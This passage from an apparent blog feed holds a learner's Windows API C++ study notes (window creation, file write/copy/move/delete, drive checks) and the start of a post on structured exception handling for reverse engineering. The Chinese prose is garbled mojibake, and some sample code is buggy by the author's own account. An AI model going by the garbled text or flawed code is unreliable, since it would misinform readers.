<li>lpCmdLine: è¿è¡Œæ—¶å‚æ•° æ¯”å¦‚ cmdè¿è¡Œ start.exe AAA  é‚£ä¹ˆlpCmdLineå°±æŒ‡å‘â€AAAâ€ LPSTRæ˜¯å¸¸ç”¨çš„å­—ç¬¦ä¸²ç±»å‹ è¿™é‡Œä¸ºç©º</li>
<li>nCmdShow: è¡¨ç¤ºåº”ç”¨ç¨‹åºçª—å£(å¦‚æœæœ‰)çš„æ˜¾ç¤ºçŠ¶æ€ è¿™é‡Œæ‰“å°10</li>
</ul>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>å¸¸ç”¨Windowsæ•°æ®ç±»å‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span>&#123;</span><br><span class="line">    LPWSTR szString = <span class="string">L&quot;Type: string&quot;</span>;</span><br><span class="line">    WCHAR lpString[<span class="number">120</span>];</span><br><span class="line">    DWORD dwMax = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    DWORD dwOne = <span class="number">0x1</span>;</span><br><span class="line">    INT iMax = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    INT iOne = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,szString,<span class="string">L&quot;LPSTR&quot;</span>,MB_OK);</span><br><span class="line">    INT len = <span class="built_in">min</span>(<span class="built_in">wcslen</span>(szString)+<span class="number">20</span>,(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">119</span>); <span class="comment">// ! wcslen!!!</span></span><br><span class="line">    cout&lt;&lt;len&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CopyMemory</span>(lpString,szString,len);</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,lpString,<span class="string">L&quot;CHAR[]&quot;</span>,MB_OK);</span><br><span class="line">    <span class="keyword">if</span>(dwMax&gt;dwOne)&#123;</span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,<span class="string">L&quot;DWORD: 0xFFFFFFFF&gt;0x1&quot;</span>,<span class="string">L&quot;DWORD&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,<span class="string">L&quot;DWORD: 0xFFFFFFFF&gt;&lt;&quot;</span>,<span class="string">L&quot;DWORD&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>^<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹¦ä¸Šå¥½å¤šéƒ½è·‘ä¸é€š  æ¯”å¦‚LPWSTRç±»å‹çš„è·å–é•¿åº¦è¦ç”¨wcslen ç›´æ¥å–len+1å¤åˆ¶è¿‡æ¥ä¸å¤§å¯¹åŠ²â€¦<br>éƒ½æœ‰unicodeçš„MessageBoxW åé¢å­—ç¬¦ä¸²åŠ L</p>
<h2 id="12-11"><a href="#12-11" class="headerlink" title="12.11"></a>12.11</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h3><p>å°†ç³»ç»Ÿç›®å½•ä¿¡æ¯å†™å…¥txt</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// å°†ç³»ç»Ÿç›®å½•ä¿¡æ¯å†™å…¥root.txt</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    TCHAR szSystemDirectory[MAX_PATH];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemDirectory</span>(szSystemDirectory,MAX_PATH);</span><br><span class="line">    <span class="built_in">strcat</span>((<span class="type">char</span>*)szSystemDirectory,<span class="string">&quot;\\WOW\\ULGANOY_desu&quot;</span>);</span><br><span class="line">    hFile = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;root.txt&quot;</span>,GENERIC_WRITE,<span class="number">0</span>,<span class="literal">NULL</span>,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hFile!=INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">lstrlen</span>(szSystemDirectory);</span><br><span class="line">        cout&lt;&lt;len&lt;&lt;<span class="string">&quot;\n\n\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">WriteFile</span>(hFile,szSystemDirectory,len,&amp;dwWritten,<span class="literal">NULL</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">GetLastError</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¦ç”¨CreateFileW!!!</p>
<h3 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h3><p>çª—å£åˆ›å»ºä»¥åŠæ¶ˆæ¯å¤„ç†</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// çª—å£åˆ›å»ºä»¥åŠæ¶ˆæ¯å¤„ç†</span></span><br><span class="line">HINSTANCE hInst;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE ,HINSTANCE ,LPSTR ,<span class="type">int</span> )</span></span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MainWndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span>&#123;</span><br><span class="line">    WNDCLASSEX wcx; <span class="comment">// çª—å£ç±»</span></span><br><span class="line">    HWND hwnd; <span class="comment">// çª—å£å¥æŸ„</span></span><br><span class="line">    MSG msg; <span class="comment">// æ¶ˆæ¯</span></span><br><span class="line">    BOOL ifGotMessage;</span><br><span class="line">    hInst = hInstance; <span class="comment">// åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„</span></span><br><span class="line"></span><br><span class="line">    wcx.cbSize = <span class="built_in">sizeof</span>(wcx);</span><br><span class="line">    wcx.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcx.lpfnWndProc = MainWndProc;</span><br><span class="line">    wcx.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcx.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    wcx.hInstance = hInstance;</span><br><span class="line">    wcx.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>,IDI_APPLICATION);</span><br><span class="line">    wcx.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>,IDC_ARROW);</span><br><span class="line">    wcx.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);</span><br><span class="line">    wcx.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">    wcx.lpszClassName = <span class="built_in">TEXT</span>(<span class="string">&quot;MainWClass&quot;</span>);</span><br><span class="line">    wcx.hIconSm = (HICON)<span class="built_in">LoadImage</span>(</span><br><span class="line">        hInstance,</span><br><span class="line">        <span class="built_in">MAKEINTRESOURCE</span>(<span class="number">5</span>),</span><br><span class="line">        IMAGE_ICON,</span><br><span class="line">        <span class="built_in">GetSystemMetrics</span>(SM_CXSMICON),</span><br><span class="line">        <span class="built_in">GetSystemMetrics</span>(SM_CYSMICON),</span><br><span class="line">        LR_DEFAULTCOLOR</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">RegisterClassEx</span>(&amp;wcx))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hwnd = <span class="built_in">CreateWindowW</span>(</span><br><span class="line">        <span class="string">L&quot;MainWClass&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;HELLO WORLD&quot;</span>,</span><br><span class="line">        WS_OVERLAPPEDWINDOW,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        (HWND)<span class="literal">NULL</span>,</span><br><span class="line">        (HMENU)<span class="literal">NULL</span>,</span><br><span class="line">        hInstance,</span><br><span class="line">        (LPVOID)<span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!hwnd)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ShowWindow</span>(hwnd,nCmdShow);</span><br><span class="line">    <span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line">    <span class="keyword">while</span>(</span><br><span class="line">        (ifGotMessage = <span class="built_in">GetMessage</span>(&amp;msg,(HWND)<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>)) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; ifGotMessage != <span class="number">-1</span></span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">        <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MainWndProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            <span class="built_in">ExitThread</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å­—ç¬¦ä¸²ç±»å‹è¿˜æ˜¯ç”¨TEXTè‡ªåŠ¨é€‚åº”æ–¹ä¾¿ç‚¹</p>
<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>åˆ¤æ–­å…‰é©±ä¸­æ˜¯å¦æœ‰å…‰ç›˜</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE         512</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    CHAR szFileSystemNameBuffer[BUFSIZE];</span><br><span class="line">    DWORD dwLastError;</span><br><span class="line">    DWORD dwFileSystemFlags;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">TEXT</span>(<span class="string">&quot;PLZ input The rootpath of Drive!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;argc&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;argv[<span class="number">0</span>]&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetDriveType</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;D:/&quot;</span>))!=DRIVE_CDROM)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DRIVER %s ISNOT CD/DVD ROM\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ€ä¹ˆæ”¹argv[1]çš„ç±»å‹ä¸GetDriveTypeå½¢å‚ç±»å‹éƒ½ä¸åŒ¹é… éº»äº†â€¦</p>
<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>åˆ é™¤ å¤åˆ¶ ç§»åŠ¨æ–‡ä»¶</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-d&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">3</span>)&#123; <span class="comment">// åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">DeleteFile</span>(argv[<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error when deleting file : %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Delete successfully!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-c&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">4</span>)&#123; <span class="comment">// å¤åˆ¶æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">CopyFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>],TRUE))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">GetLastError</span>()==<span class="number">0x50</span>) <span class="comment">// æ–‡ä»¶å­˜åœ¨</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;File %s is already exist, to overwrite? y/n: &quot;</span>,argv[<span class="number">3</span>]);</span><br><span class="line">                <span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">                <span class="keyword">if</span>(ch==<span class="string">&#x27;y&#x27;</span>||ch==<span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="built_in">CopyFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>],FALSE))&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Error copying file, %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Copy successfully!\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Copy successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-m&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">4</span>)&#123; <span class="comment">// ç§»åŠ¨æ–‡ä»¶(é‡å‘½å)</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">MoveFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>]))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error moving file: %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Move successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Invalid Parameters!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³äºå‘½ä»¤è¡Œå‚æ•°çš„ç±»å‹è½¬æ¢ ä¸ç®¡é‚£ä¹ˆå¤š ç”¨strcmpå’Œchar(æ­£å¸¸çš„cçš„å†™æ³•)å°±è¡Œäº†â€¦</p>
]]></content>
      <categories>
        <category>ReverseEngineering</category>
      </categories>
  </entry>
  <entry>
    <title>SEH</title>
    <url>/2023/12/11/SEH/</url>
    <content><![CDATA[<p>è®°å½•ä¸€äº›SEHç›¸å…³çš„reverseé¢˜ç›®&#x2F;çŸ¥è¯†ç‚¹</p>
<span id="more"></span>
<p><a href="https://www.yunzh1jun.com/2022/05/27/WindowsSEH/" target="_blank">è¿™ç¯‡</a>å†™çš„æŒºå¥½çš„<br>æœ€è¿‘åšäº†å¥½äº›å¼‚å¸¸ç›¸å…³çš„é¢˜ç›® æœ‰å¿…è¦æ€»ç»“ä»¥ä¸‹çŸ¥è¯†ç‚¹</p>
<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><h2 id="å¼‚å¸¸å€¼"><a href="#å¼‚å¸¸å€¼" class="headerlink" title="å¼‚å¸¸å€¼"></a>å¼‚å¸¸å€¼</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         <span class="number">0xC0000005</span>     </span><br><span class="line">ç¨‹åºä¼å›¾è¯»å†™ä¸€ä¸ªä¸å¯è®¿é—®çš„åœ°å€æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ä¼å›¾è¯»å–<span class="number">0</span>åœ°å€å¤„çš„å†…å­˜ã€‚</span><br><span class="line">EXCEPTION_ARRAY_BOUNDS_EXCEEDED    <span class="number">0xC000008C</span>     </span><br><span class="line">æ•°ç»„è®¿é—®è¶Šç•Œæ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_BREAKPOINT               <span class="number">0x80000003</span>     </span><br><span class="line">è§¦å‘æ–­ç‚¹æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_DATATYPE_MISALIGNMENT    <span class="number">0x80000002</span>     </span><br><span class="line">ç¨‹åºè¯»å–ä¸€ä¸ªæœªç»å¯¹é½çš„æ•°æ®æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_FLT_DENORMAL_OPERAND     <span class="number">0xC000008D</span>     </span><br><span class="line">å¦‚æœæµ®ç‚¹æ•°æ“ä½œçš„æ“ä½œæ•°æ˜¯éæ­£å¸¸çš„ï¼Œåˆ™å¼•å‘è¯¥å¼‚å¸¸ã€‚æ‰€è°“éæ­£å¸¸ï¼Œå³å®ƒçš„å€¼å¤ªå°ä»¥è‡³äºä¸èƒ½ç”¨æ ‡å‡†æ ¼å¼è¡¨ç¤ºå‡ºæ¥ã€‚</span><br><span class="line">EXCEPTION_FLT_DIVIDE_BY_ZERO       <span class="number">0xC000008E</span>     </span><br><span class="line">æµ®ç‚¹æ•°é™¤æ³•çš„é™¤æ•°æ˜¯<span class="number">0</span>æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_FLT_INEXACT_RESULT       <span class="number">0xC000008F</span>     </span><br><span class="line">æµ®ç‚¹æ•°æ“ä½œçš„ç»“æœä¸èƒ½ç²¾ç¡®è¡¨ç¤ºæˆå°æ•°æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_FLT_INVALID_OPERATION    <span class="number">0xC0000090</span>     </span><br><span class="line">è¯¥å¼‚å¸¸è¡¨ç¤ºä¸åŒ…æ‹¬åœ¨è¿™ä¸ªè¡¨å†…çš„å…¶å®ƒæµ®ç‚¹æ•°å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_FLT_OVERFLOW             <span class="number">0xC0000091</span>     </span><br><span class="line">æµ®ç‚¹æ•°çš„æŒ‡æ•°è¶…è¿‡æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_FLT_STACK_CHECK          <span class="number">0xC0000092</span>     </span><br><span class="line">è¿›è¡Œæµ®ç‚¹æ•°è¿ç®—æ—¶æ ˆå‘ç”Ÿæº¢å‡ºæˆ–ä¸‹æº¢æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_FLT_UNDERFLOW            <span class="number">0xC0000093</span>     </span><br><span class="line">æµ®ç‚¹æ•°çš„æŒ‡æ•°å°äºæ‰€èƒ½è¡¨ç¤ºçš„æœ€å°å€¼æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_ILLEGAL_INSTRUCTION      <span class="number">0xC000001D</span>     </span><br><span class="line">ç¨‹åºä¼å›¾æ‰§è¡Œä¸€ä¸ªæ— æ•ˆçš„æŒ‡ä»¤æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_IN_PAGE_ERROR            <span class="number">0xC0000006</span>     </span><br><span class="line">ç¨‹åºè¦è®¿é—®çš„å†…å­˜é¡µä¸åœ¨ç‰©ç†å†…å­˜ä¸­æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_INT_DIVIDE_BY_ZERO       <span class="number">0xC0000094</span>     </span><br><span class="line">æ•´æ•°é™¤æ³•çš„é™¤æ•°æ˜¯<span class="number">0</span>æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_INT_OVERFLOW             <span class="number">0xC0000095</span>     </span><br><span class="line">æ•´æ•°æ“ä½œçš„ç»“æœæº¢å‡ºæ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_INVALID_DISPOSITION      <span class="number">0xC0000026</span>     </span><br><span class="line">å¼‚å¸¸å¤„ç†å™¨è¿”å›ä¸€ä¸ªæ— æ•ˆçš„å¤„ç†çš„æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_NONCONTINUABLE_EXCEPTION <span class="number">0xC0000025</span>     </span><br><span class="line">å‘ç”Ÿä¸€ä¸ªä¸å¯ç»§ç»­æ‰§è¡Œçš„å¼‚å¸¸æ—¶ï¼Œå¦‚æœç¨‹åºç»§ç»­æ‰§è¡Œï¼Œåˆ™ä¼šå¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_PRIV_INSTRUCTION         <span class="number">0xC0000096</span>     </span><br><span class="line">ç¨‹åºä¼å›¾æ‰§è¡Œä¸€æ¡å½“å‰CPUæ¨¡å¼ä¸å…è®¸çš„æŒ‡ä»¤æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br><span class="line">EXCEPTION_SINGLE_STEP              <span class="number">0x80000004</span>     </span><br><span class="line">æ ‡å¿—å¯„å­˜å™¨çš„TFä½ä¸º<span class="number">1</span>æ—¶ï¼Œæ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤å°±ä¼šå¼•å‘è¯¥å¼‚å¸¸ã€‚ä¸»è¦ç”¨äºå•æ­¥è°ƒè¯•ã€‚</span><br><span class="line">EXCEPTION_STACK_OVERFLOW           <span class="number">0xC00000FD</span>     </span><br><span class="line">æ ˆæº¢å‡ºæ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="SEHé“¾"><a href="#SEHé“¾" class="headerlink" title="SEHé“¾"></a>SEHé“¾</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    <span class="comment">//æŒ‡å‘ä¸‹ä¸€ä¸ª EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">    PEXCEPTION_DISPOSITION Handler;  </span><br><span class="line">    <span class="comment">//æŒ‡å‘å¼‚å¸¸å¤„ç†å‡½æ•°</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<h2 id="å¼‚å¸¸å¤„ç†å‡½æ•°"><a href="#å¼‚å¸¸å¤„ç†å‡½æ•°" class="headerlink" title="å¼‚å¸¸å¤„ç†å‡½æ•°"></a>å¼‚å¸¸å¤„ç†å‡½æ•°</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION __cdecl _except_handler</span><br><span class="line">(</span><br><span class="line">  EXCEPTION_RECORD              *pRecord,</span><br><span class="line">  EXCEPTION_REGISTRATION_RECORD *pFrame,</span><br><span class="line">  CONTEXT                       *pContext,</span><br><span class="line">  PVOID                          pValue</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹åˆ†æç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°</p>
<h3 id="EXCEPTION-RECORD"><a href="#EXCEPTION-RECORD" class="headerlink" title="EXCEPTION_RECORD"></a>EXCEPTION_RECORD</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> &#123;</span><br><span class="line">  DWORD                    ExceptionCode;<span class="comment">//å¼‚å¸¸ä»£ç </span></span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> *ExceptionRecord;</span><br><span class="line">  PVOID                    ExceptionAddress;<span class="comment">//å¼‚å¸¸å‘ç”Ÿåœ°å€</span></span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>

